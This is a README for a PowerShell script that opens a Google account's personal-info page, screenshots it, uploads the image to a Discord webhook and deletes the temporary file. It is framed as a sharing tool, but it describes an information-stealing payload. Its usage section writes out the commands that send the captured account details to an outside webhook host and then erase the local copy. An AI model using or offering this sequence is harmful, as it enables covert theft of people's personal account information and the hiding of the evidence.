# PowerShell Email Information Capture and Discord Upload
![](https://img.shields.io/badge/-PowerShell-blue)

This PowerShell script allows you to capture information from a specified URL, take a screenshot of it, and upload it to a Discord channel using a webhook. The script is designed to help you easily share information from a specific webpage to your Discord server.

## Prerequisites

Before running the script, ensure you have the following:

1. PowerShell (v5.1 or higher) installed on your system.
2. A Discord account and the webhook URL of the channel where you want to upload the information. If you don't have a webhook URL, follow these steps to create one:
   - Go to your Discord server settings.
   - Navigate to "Integrations" > "Webhooks" and click on "Create Webhook."
   - Customize the webhook as needed and copy the webhook URL.

## Usage

1. **Get-EmailInfo Function:**

   This function captures a screenshot of a specified URL, in this case, "https://myaccount.google.com/personal-info?hl=en," but you can modify the URL as needed. The screenshot is saved temporarily as "CaliShot.png" in the system's temporary folder.

   ```powershell
   Get-EmailInfo
   ```

2. **Upload-Discord Function:**

   This function is used to upload either a screenshot file or text to the Discord channel using the webhook URL.

   - To upload a text message:

     ```powershell
     Upload-Discord -webhookUrl 'YOUR DISCORD WEBHOOK HERE' -text 'Your message here'
     ```

   - To upload a screenshot file:

     ```powershell
     $filePath = Get-EmailInfo
     Upload-Discord -webhookUrl 'YOUR DISCORD WEBHOOK HERE' -file $filePath | Out-Null
     Remove-Item -Path $filePath -Force
     ```

   Uncomment and use one of the options above as per your requirement.

## Important Notes

- The script uses the default browser to open the target URL. Ensure you have a compatible web browser installed on your system.

- The screenshot will be visible to the script's executing user, so avoid running the script in a visible session if sensitive information is being captured.

- **[Caution]** Be cautious with the use of this script, especially when handling sensitive data. Always ensure you have appropriate permissions to access and share the content.

## Disclaimer

This script is provided as-is and without warranty. Use it at your own risk. The authors are not responsible for any direct or indirect damages caused by the use of this script.

**Note:** Uncomment the last section of the script to capture the screenshot, upload it to Discord, and then delete the temporary file.

Feel free to contribute and improve this script by creating pull requests. If you encounter any issues or have suggestions for improvements, please [open an issue](https://github.com/yourusername/yourrepository/issues) on the GitHub repository.

Happy coding! 😊
